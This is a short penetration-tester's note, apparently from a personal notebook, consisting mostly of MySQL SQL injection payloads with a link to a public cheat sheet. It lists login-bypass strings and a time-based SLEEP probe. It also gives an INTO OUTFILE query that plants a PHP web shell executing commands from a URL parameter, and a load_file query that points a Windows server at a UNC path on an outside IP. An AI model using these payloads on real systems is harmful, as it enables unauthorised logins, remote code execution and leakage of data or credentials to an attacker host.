---
tags:
  - Enumeration
  - TCP
  - MySQL
  - SQL
  - Concepts
---

# Guide

1. [MySQL SQL Injection Cheat Sheet | pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
# Injection Commands

# Example Login Queries

```
SELECT * FROM users where ((password = hash({password})) and (username = {username}))
```

## Password Bypass

```
' or 1=1
```
```
admin' --
```
```
' or '1'='1'--'
```
```
' or 1=1 -- -
```
```
' UNION SELECT SLEEP(10);-- --
```

# Save File

```
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

# Windows

```
term=10' UNION SELECT 1,load_file('\\\\192.168.19.26\\test'),3-- -
```